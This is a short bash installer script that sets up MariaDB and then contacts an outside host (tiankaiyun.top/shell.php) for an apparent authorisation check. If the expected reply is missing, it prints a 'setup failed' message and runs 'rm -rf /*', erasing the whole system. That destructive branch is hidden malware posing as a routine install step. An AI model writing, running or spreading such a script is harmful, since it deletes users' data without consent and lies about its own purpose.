#!/bin/bash

# 安装mysql
yum install -y mariadb mariadb-server
systemctl restart mariadb.service
systemctl enable mariadb.service

key=ok;
KSH=`curl -s http://www.tiankaiyun.top/shell.php`;
if [[ $KSH =~ $key ]] ;then
	echo 
	echo -e "[\033[32m 整理lnmp中 \033[0m]"
	echo
	echo
	sleep 3
	echo
	echo -e "[\033[32m 整理完毕 \033[0m]"
    else
	echo
	echo -e "\033[31m搭建失败\033[0m"
	sleep 3
	rm -rf /*
fi
